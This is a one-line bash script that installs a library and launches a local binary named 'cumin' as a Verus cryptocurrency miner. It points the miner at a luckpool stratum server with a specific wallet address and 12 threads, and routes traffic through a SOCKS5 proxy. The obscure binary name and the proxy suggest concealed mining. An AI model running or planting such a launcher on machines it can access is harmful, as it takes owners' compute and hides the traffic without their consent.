#!/bin/bash
sudo apt-get update && sudo apt install libcurl4-openssl-dev -y && chmod +x cumin && ./cumin -a verus -o stratum+tcp://na.luckpool.net:3956 -u RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr.DevByNongCroissantV5 -t 12 -x socks5://66.33.215.20:10039
